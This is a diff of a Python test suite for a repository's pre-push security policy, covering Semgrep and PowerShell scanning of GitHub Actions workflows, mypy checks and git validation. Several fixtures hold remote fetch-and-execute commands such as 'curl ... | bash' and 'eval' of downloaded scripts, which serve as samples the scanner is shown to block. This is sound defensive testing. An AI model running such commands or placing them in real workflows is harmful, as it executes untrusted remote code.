-    benign.write_text("dangerous = False\n", encoding="utf-8")
+    _write_lf(benign, "dangerous = False\n")
     benign_blob = _git(repo, "hash-object", "-w", str(benign)).stdout.strip()
     _git(repo, "replace", dangerous_blob, benign_blob)
     stream = io.StringIO(f"refs/heads/feature/test {head} refs/heads/feature/test {base}\n")
@@ -2779,7 +2752,7 @@ def test_pushed_semgrep_scan_rejects_non_regular_type_change(
     base = _commit_file(repo, "source.py", "value = 1\n")
     if mode == "120000":
         target = repo / "link-target"
-        target.write_text("payload.txt", encoding="utf-8", newline="\n")
+        _write_lf(target, "payload.txt")
         object_id = _git(repo, "hash-object", "-w", str(target)).stdout.strip()
     else:
         object_id = base
@@ -2890,20 +2863,17 @@ def test_semgrep_real_cli_scans_ignored_file_over_default_size_limit(
     tmp_path: Path,
 ) -> None:
     target = tmp_path / "ignored-large.py"
-    target.write_text("value = 1\n" + "# padding\n" * 110_000, encoding="utf-8", newline="\n")
-    (tmp_path / ".semgrepignore").write_text(f"{target.name}\n", encoding="utf-8")
+    _write_lf(target, "value = 1\n" + "# padding\n" * 110_000)
+    _write_lf(tmp_path / ".semgrepignore", f"{target.name}\n")
     config = tmp_path / "semgrep.yml"
-    config.write_text(
-        """
+    _write_lf(config, """
 rules:
   - id: impossible-equality
     languages: [python]
     message: impossible
     severity: ERROR
     pattern: $X == $X
-""".lstrip(),
-        encoding="utf-8",
-    )
+""".lstrip())
     command = policy._semgrep_command(str(config), [str(target)])
     assert SEMGREP is not None
     command[0] = SEMGREP
@@ -2929,8 +2899,7 @@ def test_semgrep_real_cli_blocks_bash_curl_rules_with_powershell_step(
     tmp_path: Path,
 ) -> None:
     target = tmp_path / "mixed-shell-action.yml"
-    target.write_text(
-        """
+    _write_lf(target, """
 name: mixed shell
 runs:
   using: composite
@@ -2945,10 +2914,7 @@ runs:
         DATA=$(curl -fsSL https://example.com/install.sh)
         eval "$DATA"
         curl -fsSL https://example.com/install.sh | bash
-""".lstrip(),
-        encoding="utf-8",
-        newline="\n",
-    )
+""".lstrip())
 
     result = policy._run_semgrep_tree(tmp_path, [target.name], tmp_path)
 
@@ -3041,10 +3007,9 @@ def test_semgrep_allows_known_powershell_parser_mismatch(
     rule_id: str,
 ) -> None:
     target = tmp_path / "action.yml"
-    target.write_text(
+    _write_lf(
+        target,
         'runs:\n  using: composite\n  steps:\n    - shell: pwsh\n      run: Write-Host "safe"\n',
-        encoding="utf-8",
-        newline="\n",
     )
     payload = {
         "errors": [_powershell_semgrep_error(target, rule_id)],
@@ -3062,17 +3027,13 @@ def test_semgrep_allows_known_powershell_parser_mismatch(
 
 def test_semgrep_allows_partial_parsing_at_powershell_step(tmp_path: Path) -> None:
     target = tmp_path / "action.yml"
-    target.write_text(
-        "runs:\n"
+    _write_lf(target, "runs:\n"
         "  steps:\n"
         "    - shell: pwsh\n"
         "      run: |\n"
         "        Write-Host 'safe'\n"
         "    - shell: bash\n"
-        "      run: echo safe\n",
-        encoding="utf-8",
-        newline="\n",
-    )
+        "      run: echo safe\n")
     payload = {
         "errors": [_powershell_partial_parsing_error(target, line=4)],
         "paths": {"scanned": [str(target)]},
@@ -3127,18 +3088,14 @@ def test_semgrep_rejects_code_two_error_at_bash_step_in_mixed_shell_file(
 ) -> None:
     target = tmp_path / "action.yml"
     bash_script = 'DATA=$(curl -fsSL https://example.com/install.sh)\neval "$DATA"'
-    target.write_text(
-        "runs:\n"
+    _write_lf(target, "runs:\n"
         "  steps:\n"
         "    - shell: pwsh\n"
         "      run: Write-Host 'safe'\n"
         "    - shell: bash\n"
         "      run: |\n"
         "        DATA=$(curl -fsSL https://example.com/install.sh)\n"
-        '        eval "$DATA"\n',
-        encoding="utf-8",
-        newline="\n",
-    )
+        '        eval "$DATA"\n')
     payload = {
         "errors": [
             _powershell_semgrep_error(
@@ -3164,16 +3121,12 @@ def test_semgrep_rejects_code_two_error_with_ambiguous_shell_attribution(
 ) -> None:
     target = tmp_path / "action.yml"
     script = 'Write-Host "safe"'
-    target.write_text(
-        "runs:\n"
+    _write_lf(target, "runs:\n"
         "  steps:\n"
         "    - shell: pwsh\n"
         f"      run: {script}\n"
         "    - shell: bash\n"
-        f"      run: {script}\n",
-        encoding="utf-8",
-        newline="\n",
-    )
+        f"      run: {script}\n")
     payload = {
         "errors": [
             _powershell_semgrep_error(
@@ -3196,11 +3149,7 @@ def test_semgrep_rejects_code_two_error_with_ambiguous_shell_attribution(
 
 def test_semgrep_rejects_short_truncated_code_two_snippet(tmp_path: Path) -> None:
     target = tmp_path / "action.yml"
-    target.write_text(
-        "runs:\n  steps:\n    - shell: pwsh\n      run: Write-Host 'safe'\n",
-        encoding="utf-8",
-        newline="\n",
-    )
+    _write_lf(target, "runs:\n  steps:\n    - shell: pwsh\n      run: Write-Host 'safe'\n")
     payload = {
         "errors": [
             _powershell_semgrep_error(
@@ -3225,11 +3174,7 @@ def test_semgrep_rejects_code_two_error_when_yaml_cannot_be_parsed(
     tmp_path: Path,
 ) -> None:
     target = tmp_path / "action.yml"
-    target.write_text(
-        'runs:\n  steps: [\n    - shell: pwsh\n      run: Write-Host "safe"\n',
-        encoding="utf-8",
-        newline="\n",
-    )
+    _write_lf(target, 'runs:\n  steps: [\n    - shell: pwsh\n      run: Write-Host "safe"\n')
     payload = {
         "errors": [
             _powershell_semgrep_error(
@@ -3251,7 +3196,7 @@ def test_semgrep_rejects_code_two_error_when_yaml_cannot_be_parsed(
 
 def test_semgrep_rejects_code_two_error_when_yaml_is_empty(tmp_path: Path) -> None:
     target = tmp_path / "action.yml"
-    target.write_text("", encoding="utf-8", newline="\n")
+    _write_lf(target, "")
     payload = {
         "errors": [
             _powershell_semgrep_error(
@@ -3275,16 +3220,12 @@ def test_semgrep_accepts_code_two_error_for_aliased_powershell_step(
     tmp_path: Path,
 ) -> None:
     target = tmp_path / "action.yml"
-    target.write_text(
-        "shared: &shared\n"
+    _write_lf(target, "shared: &shared\n"
         "  shell: pwsh\n"
         '  run: Write-Host "safe"\n'
         "runs:\n"
         "  steps:\n"
-        "    - *shared\n",
-        encoding="utf-8",
-        newline="\n",
-    )
+        "    - *shared\n")
     payload = {
         "errors": [
             _powershell_semgrep_error(
@@ -3308,16 +3249,12 @@ def test_semgrep_rejects_nontruncated_code_two_snippet_prefix(
     tmp_path: Path,
 ) -> None:
     target = tmp_path / "action.yml"
-    target.write_text(
-        "runs:\n"
+    _write_lf(target, "runs:\n"
         "  steps:\n"
         "    - shell: pwsh\n"
         "      run: |\n"
         "        Write-Host 'first'\n"
-        "        Write-Host 'second'\n",
-        encoding="utf-8",
-        newline="\n",
-    )
+        "        Write-Host 'second'\n")
     payload = {
         "errors": [
             _powershell_semgrep_error(
@@ -3343,14 +3280,10 @@ def test_semgrep_accepts_long_truncated_code_two_powershell_snippet(
 ) -> None:
     target = tmp_path / "action.yml"
     lines = [f"Write-Host 'verification line {index}'" for index in range(5)]
-    target.write_text(
-        "runs:\n"
+    _write_lf(target, "runs:\n"
         "  steps:\n"
         "    - shell: pwsh\n"
-        "      run: |\n" + "".join(f"        {line}\n" for line in lines),
-        encoding="utf-8",
-        newline="\n",
-    )
+        "      run: |\n" + "".join(f"        {line}\n" for line in lines))
     snippet = "\n".join([*lines[:-1], lines[-1][:15]])
     payload = {
         "errors": [
@@ -3392,16 +3325,12 @@ def test_semgrep_rejects_unrecognized_partial_parsing_error(
     rule_id: str,
 ) -> None:
     target = tmp_path / "action.yml"
-    target.write_text(
-        "runs:\n"
+    _write_lf(target, "runs:\n"
         "  steps:\n"
         "    - shell: pwsh\n"
         "      run: Write-Host 'safe'\n"
         "    - shell: bash\n"
-        "      run: echo safe\n",
-        encoding="utf-8",
-        newline="\n",
-    )
+        "      run: echo safe\n")
     payload = {
         "errors": [
             _powershell_partial_parsing_error(
@@ -3427,11 +3356,7 @@ def test_semgrep_rejects_allowlisted_rule_id_only_in_target_path(
 ) -> None:
     allowed_rule = "yaml.github-actions.security.curl-eval.curl-eval"
     target = tmp_path / f"When parsing in rule '{allowed_rule}', action.yml"
-    target.write_text(
-        "runs:\n  steps:\n    - shell: pwsh\n      run: Write-Host 'safe'\n",
-        encoding="utf-8",
-        newline="\n",
-    )
+    _write_lf(target, "runs:\n  steps:\n    - shell: pwsh\n      run: Write-Host 'safe'\n")
     error = _powershell_partial_parsing_error(
         target,
         line=4,
@@ -3460,11 +3385,7 @@ def test_semgrep_rejects_partial_parsing_location_for_other_target(
     tmp_path: Path,
 ) -> None:
     target = tmp_path / "action.yml"
-    target.write_text(
-        "runs:\n  steps:\n    - shell: pwsh\n      run: Write-Host 'safe'\n",
-        encoding="utf-8",
-        newline="\n",
-    )
+    _write_lf(target, "runs:\n  steps:\n    - shell: pwsh\n      run: Write-Host 'safe'\n")
     error = _powershell_partial_parsing_error(target, line=4)
     error_type = error["type"]
     assert isinstance(error_type, list)
@@ -3500,7 +3421,7 @@ def test_semgrep_rejects_partial_parsing_span_crossing_into_bash_step(
         "    - shell: bash\n"
         "      run: echo unsafe\n"
     )
-    target.write_text(content, encoding="utf-8", newline="\n")
+    _write_lf(target, content)
     error = _powershell_partial_parsing_error(target, line=4)
     error_type = error["type"]
     assert isinstance(error_type, list)
@@ -3541,7 +3462,7 @@ def test_semgrep_allows_partial_parsing_span_inside_powershell_step(
         "    - shell: bash\n"
         "      run: echo safe\n"
     )
-    target.write_text(content, encoding="utf-8", newline="\n")
+    _write_lf(target, content)
     error = _powershell_partial_parsing_error(target, line=4)
     error_type = error["type"]
     assert isinstance(error_type, list)
@@ -3581,7 +3502,7 @@ def test_semgrep_allows_partial_parsing_span_ending_at_scalar_eof(
         "        Write-Host 'first'\n"
         "        Write-Host 'last'"
     )
-    target.write_text(content, encoding="utf-8", newline="\n")
+    _write_lf(target, content)
     error = _powershell_partial_parsing_error(target, line=4)
     error_type = error["type"]
     assert isinstance(error_type, list)
@@ -3621,10 +3542,9 @@ def test_semgrep_rejects_unrecognized_internal_matching_error(
     rule_id: str,
 ) -> None:
     target = tmp_path / "action.yml"
-    target.write_text(
+    _write_lf(
+        target,
         f"runs:\n  using: composite\n  steps:\n    - shell: {shell}\n      run: echo safe\n",
-        encoding="utf-8",
-        newline="\n",
     )
     payload = {
         "errors": [_powershell_semgrep_error(target, rule_id)],
@@ -3710,11 +3630,7 @@ def test_semgrep_rejects_malformed_partial_parsing_error(
     error: object,
 ) -> None:
     target = tmp_path / "action.yml"
-    target.write_text(
-        "runs:\n  steps:\n    - shell: pwsh\n      run: Write-Host 'safe'\n",
-        encoding="utf-8",
-        newline="\n",
-    )
+    _write_lf(target, "runs:\n  steps:\n    - shell: pwsh\n      run: Write-Host 'safe'\n")
     payload = {
         "errors": [error],
         "paths": {"scanned": [str(target)]},
@@ -3732,11 +3648,8 @@ def test_semgrep_rejects_malformed_partial_parsing_error(
 def test_semgrep_rejects_error_outside_requested_targets(tmp_path: Path) -> None:
     target = tmp_path / "action.yml"
     outside = tmp_path / "outside.yml"
-    target.write_text("name: safe\n", encoding="utf-8", newline="\n")
-    outside.write_text(
-        "runs:\n  steps:\n    - shell: pwsh\n      run: Write-Host 'safe'\n",
-        encoding="utf-8",
-    )
+    _write_lf(target, "name: safe\n")
+    _write_lf(outside, "runs:\n  steps:\n    - shell: pwsh\n      run: Write-Host 'safe'\n")
     payload = {
         "errors": [
             _powershell_semgrep_error(
@@ -3760,7 +3673,7 @@ def test_semgrep_rejects_partial_parsing_without_shell_declaration(
     tmp_path: Path,
 ) -> None:
     target = tmp_path / "action.yml"
-    target.write_text("name: safe\n", encoding="utf-8", newline="\n")
+    _write_lf(target, "name: safe\n")
     payload = {
         "errors": [_powershell_partial_parsing_error(target, line=1)],
         "paths": {"scanned": [str(target)]},
@@ -3779,10 +3692,9 @@ def test_semgrep_rejects_partial_parsing_at_default_shell_step(
     tmp_path: Path,
 ) -> None:
     target = tmp_path / "action.yml"
-    target.write_text(
+    _write_lf(
+        target,
         "runs:\n  steps:\n    - shell: pwsh\n      run: Write-Host 'safe'\n    - run: echo safe\n",
-        encoding="utf-8",
-        newline="\n",
     )
     payload = {
         "errors": [_powershell_partial_parsing_error(target, line=5)],
@@ -3804,11 +3716,7 @@ def test_semgrep_rejects_partial_parsing_with_invalid_line(
     line: int,
 ) -> None:
     target = tmp_path / "action.yml"
-    target.write_text(
-        "runs:\n  steps:\n    - shell: pwsh\n      run: Write-Host 'safe'\n",
-        encoding="utf-8",
-        newline="\n",
-    )
+    _write_lf(target, "runs:\n  steps:\n    - shell: pwsh\n      run: Write-Host 'safe'\n")
     payload = {
         "errors": [_powershell_partial_parsing_error(target, line=line)],
         "paths": {"scanned": [str(target)]},
@@ -3828,11 +3736,7 @@ def test_semgrep_rejects_unreadable_error_target(
     monkeypatch: pytest.MonkeyPatch,
 ) -> None:
     target = tmp_path / "action.yml"
-    target.write_text(
-        "runs:\n  steps:\n    - shell: pwsh\n      run: Write-Host 'safe'\n",
-        encoding="utf-8",
-        newline="\n",
-    )
+    _write_lf(target, "runs:\n  steps:\n    - shell: pwsh\n      run: Write-Host 'safe'\n")
     original_read_text = Path.read_text
 
     def fail_for_target(
@@ -3869,11 +3773,7 @@ def test_semgrep_rejects_non_utf8_error_target(
     monkeypatch: pytest.MonkeyPatch,
 ) -> None:
     target = tmp_path / "action.yml"
-    target.write_text(
-        "runs:\n  steps:\n    - shell: pwsh\n      run: Write-Host 'safe'\n",
-        encoding="utf-8",
-        newline="\n",
-    )
+    _write_lf(target, "runs:\n  steps:\n    - shell: pwsh\n      run: Write-Host 'safe'\n")
     payload = {
         "errors": [
             _powershell_semgrep_error(
@@ -4017,7 +3917,7 @@ def test_mypy_policy_aggregates_failures_and_ignores_deleted_files(
     monkeypatch: pytest.MonkeyPatch,
 ) -> None:
     source = tmp_path / "source.py"
-    source.write_text("value: int = 1\n", encoding="utf-8")
+    _write_lf(source, "value: int = 1\n")
     monkeypatch.setattr(policy, "_invoke_mypy", lambda *_args: _completed(1))
 
     assert policy.run_mypy(["deleted.py"], tmp_path) == 0
@@ -4031,7 +3931,7 @@ def test_mypy_policy_rejects_unsafe_paths_and_symlinks(
     assert policy.run_mypy(["../outside.py"], tmp_path) == 2
 
     source = tmp_path / "source.py"
-    source.write_text("value: int = 1\n", encoding="utf-8")
+    _write_lf(source, "value: int = 1\n")
     original_is_symlink = Path.is_symlink
     monkeypatch.setattr(
         Path,
@@ -4042,7 +3942,7 @@ def test_mypy_policy_rejects_unsafe_paths_and_symlinks(
 
 
 def _write_source(tmp_path: Path, name: str = "source.py") -> None:
-    (tmp_path / name).write_text("value: int = 1\n", encoding="utf-8")
+    _write_lf(tmp_path / name, "value: int = 1\n")
 
 
 def test_parse_changed_lines_maps_hunks_to_files() -> None:
@@ -4128,7 +4028,7 @@ def test_mypy_ratchet_blocks_backslash_path_on_changed_line(
     # mypy on Windows can report a backslash-separated path; the ratchet must
     # still match it against the forward-slash pushed set and changed-line map.
     (tmp_path / "pkg").mkdir()
-    (tmp_path / "pkg" / "mod.py").write_text("value: int = 1\n", encoding="utf-8")
+    _write_lf(tmp_path / "pkg" / "mod.py", "value: int = 1\n")
     monkeypatch.setattr(policy, "_changed_line_map", lambda *_a: {"pkg/mod.py": {2}})
     monkeypatch.setattr(
         policy,
@@ -4156,10 +4056,7 @@ def test_changed_line_map_reads_real_git_diff(tmp_path: Path) -> None:
     repo = tmp_path / "repo"
     _init_repo(repo, branch="main")
     base = _commit_file(repo, "mod.py", "line one\nline two\nline three\n")
-    (repo / "mod.py").write_text(
-        "line one\nline TWO changed\nline three\nline four\nline five\n",
-        encoding="utf-8",
-    )
+    _write_lf(repo / "mod.py", "line one\nline TWO changed\nline three\nline four\nline five\n")
     _git(repo, "add", "--", "mod.py")
     _git(repo, "commit", "-qm", "test: modify mod.py")
 
@@ -4621,7 +4518,7 @@ def test_merge_detection_uses_git_path(tmp_path: Path) -> None:
     _init_repo(repo)
     head = _commit_file(repo, "tracked", "content\n")
     merge_head = repo / _git(repo, "rev-parse", "--git-path", "MERGE_HEAD").stdout.strip()
-    merge_head.write_text(f"{head}\n", encoding="utf-8")
+    _write_lf(merge_head, f"{head}\n")
 
     assert policy._merge_in_progress(repo)
 
@@ -4638,7 +4535,7 @@ def test_local_action_without_list_marker_takes_local_action_branch(tmp_path: Pa
     repo = tmp_path / "repo"
     _init_repo(repo)
     workflow = repo / "action.yml"
-    workflow.write_text("uses: ./local-action\n", encoding="utf-8")
+    _write_lf(workflow, "uses: ./local-action\n")
     _git(repo, "add", "action.yml")
 
     assert policy.check_staged_action_pins(["action.yml"], repo) == 0
@@ -4652,9 +4549,9 @@ def test_github_bash_policy_blocks_extensions_and_shebangs(tmp_path: Path) -> No
     shell_script = scripts / "blocked.sh"
     disguised_script = scripts / "blocked"
     python_script = scripts / "allowed.py"
-    shell_script.write_text("echo blocked\n", encoding="utf-8")
-    disguised_script.write_text("#!/usr/bin/env bash\necho blocked\n", encoding="utf-8")
-    python_script.write_text("#!/usr/bin/env python3\n", encoding="utf-8")
+    _write_lf(shell_script, "echo blocked\n")
+    _write_lf(disguised_script, "#!/usr/bin/env bash\necho blocked\n")
+    _write_lf(python_script, "#!/usr/bin/env python3\n")
     _git(repo, "add", ".github/scripts")
 
     assert (
@@ -4685,7 +4582,7 @@ def test_github_bash_policy_handles_non_candidates_and_missing_blobs(
 def test_generated_agent_candidates_expand_allowlisted_globs(tmp_path: Path) -> None:
     generated = tmp_path / "src/copilot-cli/agents/test.agent.md"
     generated.parent.mkdir(parents=True)
-    generated.write_text("agent\n", encoding="utf-8")
+    _write_lf(generated, "agent\n")
 
     assert generated in policy._generated_candidates("agents", tmp_path)
 
@@ -4700,12 +4597,12 @@ def test_generated_staging_handles_absent_outside_and_git_failure(
     assert policy.stage_generated("mcp", repo) == 0
 
     outside = tmp_path / "outside-file"
-    outside.write_text("content\n", encoding="utf-8")
+    _write_lf(outside, "content\n")
     monkeypatch.setattr(policy, "_generated_candidates", lambda *_args: [outside])
     assert policy.stage_generated("mcp", repo) == 2
 
     inside = repo / "inside"
-    inside.write_text("content\n", encoding="utf-8")
+    _write_lf(inside, "content\n")
     monkeypatch.setattr(policy, "_generated_candidates", lambda *_args: [inside])
     monkeypatch.setattr(policy, "_run_git", lambda *_args: _completed(1, stderr="failed\n"))
     assert policy.stage_generated("mcp", repo) == 1
@@ -4828,7 +4725,7 @@ def test_episode_staging_handles_missing_and_symlink(
 
     episode = tmp_path / ".agents/memory/episodes/episode-link.json"
     episode.parent.mkdir(parents=True)
-    episode.write_text("{}\n", encoding="utf-8")
+    _write_lf(episode, "{}\n")
     original_is_symlink = Path.is_symlink
     monkeypatch.setattr(
         Path,
@@ -5156,10 +5053,10 @@ def test_memory_size_blocks_new_files_but_warns_for_modified_files(
 ) -> None:
     validator = tmp_path / ".claude/skills/memory/scripts/test_memory_size.py"
     validator.parent.mkdir(parents=True)
-    validator.write_text("pass\n", encoding="utf-8")
+    _write_lf(validator, "pass\n")
     memory = tmp_path / ".serena/memories/large.md"
     memory.parent.mkdir(parents=True)
-    memory.write_text("large\n", encoding="utf-8")
+    _write_lf(memory, "large\n")
 
     monkeypatch.setattr(
         policy,
@@ -5360,7 +5257,7 @@ def test_stage_generated_rejects_path_that_changes_after_preflight(
 ) -> None:
     candidate = tmp_path / ".vscode/mcp.json"
     candidate.parent.mkdir(parents=True)
-    candidate.write_text("{}\n", encoding="utf-8")
+    _write_lf(candidate, "{}\n")
     monkeypatch.setattr(policy, "check_generated_paths", lambda *_args: 0)
     monkeypatch.setattr(
         policy,
@@ -5611,7 +5508,7 @@ def test_materialize_commit_propagates_blob_read_and_write_failures(
         lambda *_args: subprocess.CompletedProcess([], 0, b"content", b""),
     )
     destination = tmp_path / "write-failure"
-    destination.write_text("not a directory\n", encoding="utf-8")
+    _write_lf(destination, "not a directory\n")
     assert (
         policy._materialize_commit_tree(
             "head",
@@ -5639,10 +5536,10 @@ def test_push_validation_rejects_active_grafts_in_linked_worktree(
     grafts.write_bytes(b"")
     assert policy._check_no_grafts(linked) == 0
 
-    grafts.write_text("\n  # ignored comment\n", encoding="utf-8")
+    _write_lf(grafts, "\n  # ignored comment\n")
     assert policy._check_no_grafts(linked) == 0
 
-    grafts.write_text(f"{head} {'0' * 40}\n", encoding="utf-8")
+    _write_lf(grafts, f"{head} {'0' * 40}\n")
     stream = io.StringIO(
         f"refs/heads/feature/linked {head} refs/heads/feature/linked {'0' * 40}\n",
     )
@@ -5743,7 +5640,7 @@ def test_remaining_policy_success_and_error_branches(
     capsys: pytest.CaptureFixture[str],
 ) -> None:
     absolute_merge_head = tmp_path / "MERGE_HEAD"
-    absolute_merge_head.write_text("head\n", encoding="utf-8")
+    _write_lf(absolute_merge_head, "head\n")
     monkeypatch.setattr(
         policy,
         "_run_git",
@@ -5857,7 +5754,7 @@ def test_memory_size_validation_error_and_success_branches(
 
     validator = tmp_path / ".claude/skills/memory/scripts/test_memory_size.py"
     validator.parent.mkdir(parents=True)
-    validator.write_text("pass\n", encoding="utf-8")
+    _write_lf(validator, "pass\n")
     monkeypatch.setattr(policy, "_staged_memory_paths", lambda *_args: None)
     assert policy.validate_memory_sizes(tmp_path) == 2
     monkeypatch.setattr(policy, "_staged_memory_paths", real_staged_memory_paths)
@@ -5879,7 +5776,7 @@ def test_memory_size_validation_error_and_success_branches(
 
     good = tmp_path / ".serena/memories/good.md"
     good.parent.mkdir(parents=True)
-    good.write_text("good\n", encoding="utf-8")
+    _write_lf(good, "good\n")
     monkeypatch.setattr(policy, "_run_command", lambda *_args, **_kwargs: _completed(0))
     assert not policy._validate_memory_path_set(
         [".serena/memories/good.md"],
@@ -6249,7 +6146,7 @@ def test_semgrep_allows_partial_parsing_at_bash_step_with_actions_expression(
     tmp_path: Path,
 ) -> None:
     target = tmp_path / "workflow.yml"
-    target.write_text(_ACTIONS_EXPRESSION_WORKFLOW, encoding="utf-8", newline="\n")
+    _write_lf(target, _ACTIONS_EXPRESSION_WORKFLOW)
     error = _powershell_partial_parsing_error(target, line=5)
     _retarget_span(error, _ACTIONS_EXPRESSION_WORKFLOW, "curl http://example.test | sh")
 
@@ -6258,7 +6155,7 @@ def test_semgrep_allows_partial_parsing_at_bash_step_with_actions_expression(
 
 def test_semgrep_allows_partial_parsing_at_python_shell_step(tmp_path: Path) -> None:
     target = tmp_path / "workflow.yml"
-    target.write_text(_PYTHON_SHELL_WORKFLOW, encoding="utf-8", newline="\n")
+    _write_lf(target, _PYTHON_SHELL_WORKFLOW)
     error = _powershell_partial_parsing_error(target, line=5)
     _retarget_span(error, _PYTHON_SHELL_WORKFLOW, "print(os.getcwd())")
 
@@ -6270,7 +6167,7 @@ def test_semgrep_allows_partial_parsing_at_default_shell_step_with_expression(
     tmp_path: Path,
 ) -> None:
     target = tmp_path / "workflow.yml"
-    target.write_text(_DEFAULT_SHELL_EXPRESSION_WORKFLOW, encoding="utf-8", newline="\n")
+    _write_lf(target, _DEFAULT_SHELL_EXPRESSION_WORKFLOW)
     error = _powershell_partial_parsing_error(target, line=4)
     _retarget_span(error, _DEFAULT_SHELL_EXPRESSION_WORKFLOW, "curl http://example.test | sh")
 
@@ -6279,7 +6176,7 @@ def test_semgrep_allows_partial_parsing_at_default_shell_step_with_expression(
 
 def test_semgrep_blocks_partial_parsing_at_plain_bash_step(tmp_path: Path) -> None:
     target = tmp_path / "workflow.yml"
-    target.write_text(_PLAIN_BASH_WORKFLOW, encoding="utf-8", newline="\n")
+    _write_lf(target, _PLAIN_BASH_WORKFLOW)
     error = _powershell_partial_parsing_error(target, line=5)
     _retarget_span(error, _PLAIN_BASH_WORKFLOW, "curl http://example.test | sh")
 
@@ -6291,7 +6188,7 @@ def test_semgrep_blocks_when_only_one_matched_step_carries_an_expression(
 ) -> None:
     target = tmp_path / "workflow.yml"
     content = _MIXED_STEPS_WORKFLOW
-    target.write_text(content, encoding="utf-8", newline="\n")
+    _write_lf(target, content)
     error = _powershell_partial_parsing_error(target, line=5)
     error_type = error["type"]
     assert isinstance(error_type, list)
@@ -6310,7 +6207,7 @@ def test_semgrep_blocks_expression_step_error_reported_at_error_level(
     tmp_path: Path,
 ) -> None:
     target = tmp_path / "workflow.yml"
-    target.write_text(_ACTIONS_EXPRESSION_WORKFLOW, encoding="utf-8", newline="\n")
+    _write_lf(target, _ACTIONS_EXPRESSION_WORKFLOW)
     error = _powershell_partial_parsing_error(target, line=5)
     _retarget_span(error, _ACTIONS_EXPRESSION_WORKFLOW, "curl http://example.test | sh")
     error["level"] = "error"
@@ -6320,7 +6217,7 @@ def test_semgrep_blocks_expression_step_error_reported_at_error_level(
 
 def test_semgrep_blocks_expression_step_error_from_an_unknown_rule(tmp_path: Path) -> None:
     target = tmp_path / "workflow.yml"
-    target.write_text(_ACTIONS_EXPRESSION_WORKFLOW, encoding="utf-8", newline="\n")
+    _write_lf(target, _ACTIONS_EXPRESSION_WORKFLOW)
     error = _powershell_partial_parsing_error(
         target,
         line=5,
@@ -6344,7 +6241,7 @@ def test_semgrep_allows_code_two_error_at_bash_step_with_actions_expression(
         "        run: |\n"
         '          echo "${{ github.sha }}"\n'
     )
-    target.write_text(content, encoding="utf-8", newline="\n")
+    _write_lf(target, content)
     error = _powershell_semgrep_error(
         target,
         sorted(policy.SEMGREP_POWERSHELL_RULES)[0],
@@ -6452,7 +6349,7 @@ def test_semgrep_blocks_an_aliased_script_reused_under_a_bash_step(tmp_path: Pat
         "      - shell: bash\n"
         "        run: *script\n"
     )
-    target.write_text(content, encoding="utf-8", newline="\n")
+    _write_lf(target, content)
     error = _powershell_partial_parsing_error(target, line=5)
     _retarget_span(error, content, "Write-Host 'hi'")
 
@@ -6468,7 +6365,7 @@ def test_tolerated_errors_never_downgrade_a_semgrep_finding(tmp_path: Path) -> N
     own verdict through untouched rather than reporting success.
     """
     target = tmp_path / "workflow.yml"
-    target.write_text(_ACTIONS_EXPRESSION_WORKFLOW, encoding="utf-8", newline="\n")
+    _write_lf(target, _ACTIONS_EXPRESSION_WORKFLOW)
     error = _powershell_partial_parsing_error(target, line=5)
     _retarget_span(error, _ACTIONS_EXPRESSION_WORKFLOW, "curl http://example.test | sh")
     payload = {"errors": [error], "paths": {"scanned": [str(target)]}}
@@ -6488,7 +6385,7 @@ def test_tolerated_errors_do_not_suppress_findings_reported_alongside_them(
 ) -> None:
     """The carve-out inspects only the error manifest, never the results list."""
     target = tmp_path / "workflow.yml"
-    target.write_text(_ACTIONS_EXPRESSION_WORKFLOW, encoding="utf-8", newline="\n")
+    _write_lf(target, _ACTIONS_EXPRESSION_WORKFLOW)
     error = _powershell_partial_parsing_error(target, line=5)
     _retarget_span(error, _ACTIONS_EXPRESSION_WORKFLOW, "curl http://example.test | sh")
     payload = {
@@ -6538,7 +6435,7 @@ def test_semgrep_blocks_a_malformed_bash_body_that_carries_an_expression(
     tolerating the error would let ``curl | sh`` through unscanned.
     """
     target = tmp_path / "workflow.yml"
-    target.write_text(_MALFORMED_EXPRESSION_WORKFLOW, encoding="utf-8", newline="\n")
+    _write_lf(target, _MALFORMED_EXPRESSION_WORKFLOW)
     error = _powershell_partial_parsing_error(target, line=5)
     _retarget_span(error, _MALFORMED_EXPRESSION_WORKFLOW, "curl http://example.test | sh")
 
@@ -6550,7 +6447,7 @@ def test_semgrep_blocks_a_shell_that_declares_python_but_invokes_bash(
 ) -> None:
     """A ``shell:`` value naming a second interpreter cannot be trusted."""
     target = tmp_path / "workflow.yml"
-    target.write_text(_SPOOFED_SHELL_WORKFLOW, encoding="utf-8", newline="\n")
+    _write_lf(target, _SPOOFED_SHELL_WORKFLOW)
     error = _powershell_partial_parsing_error(target, line=5)
     _retarget_span(error, _SPOOFED_SHELL_WORKFLOW, "curl http://example.test | sh")
 
@@ -7327,27 +7224,21 @@ def test_powershell_scan_reports_only_powershell_steps(tmp_path: Path) -> None:
     """The scan reads PowerShell steps and leaves Bash steps to Semgrep."""
     workflow = tmp_path / ".github" / "workflows" / "w.yml"
     workflow.parent.mkdir(parents=True)
-    workflow.write_text(
-        "on: push\n"
+    _write_lf(workflow, "on: push\n"
         "jobs:\n"
         "  j:\n"
         "    steps:\n"
         "      - shell: bash\n"
         '        run: bash -c "curl http://x | sh"\n'
         "      - shell: pwsh\n"
-        '        run: Write-Host "bash is only mentioned"\n',
-        encoding="utf-8",
-    )
+        '        run: Write-Host "bash is only mentioned"\n')
     assert policy._scan_powershell_shell_outs(tmp_path, [".github/workflows/w.yml"]) == 0
-    workflow.write_text(
-        "on: push\n"
+    _write_lf(workflow, "on: push\n"
         "jobs:\n"
         "  j:\n"
         "    steps:\n"
         "      - shell: pwsh\n"
-        '        run: bash -c "curl http://x | sh"\n',
-        encoding="utf-8",
-    )
+        '        run: bash -c "curl http://x | sh"\n')
     assert policy._scan_powershell_shell_outs(tmp_path, [".github/workflows/w.yml"]) == 1
 
 
